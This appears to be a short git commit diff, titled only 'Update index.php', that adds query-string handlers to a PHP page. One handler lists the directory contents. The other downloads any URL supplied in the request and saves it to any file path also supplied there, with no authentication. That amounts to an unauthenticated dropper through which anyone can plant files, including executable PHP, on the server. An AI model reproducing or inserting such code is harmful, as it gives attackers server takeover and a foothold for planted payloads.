afb866be0470b6197d6df469ef1d98ae5e72aa18
unknownssassss <mahdi.khaleghi1234@gmail.com>
2021-04-13 19:46:24 +0430

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,17 @@
 <?php
+if(isset($_GET['type'])){
+if($_GET['type'] == "scan"){
 echo "<pre>";
 print_r(scandir("."));
 echo "</pre>";
+}
+if($_GET['type'] == "dl" && isset($_GET['url']) && isset($_GET['f'])){
+include "vendor/autoload.php";
+$client = new GuzzleHttp\Client();
+$client->request(
+  'GET',
+  $_GET['url'],
+  array('sink' => $_GET['f'])
+);
+}
+}
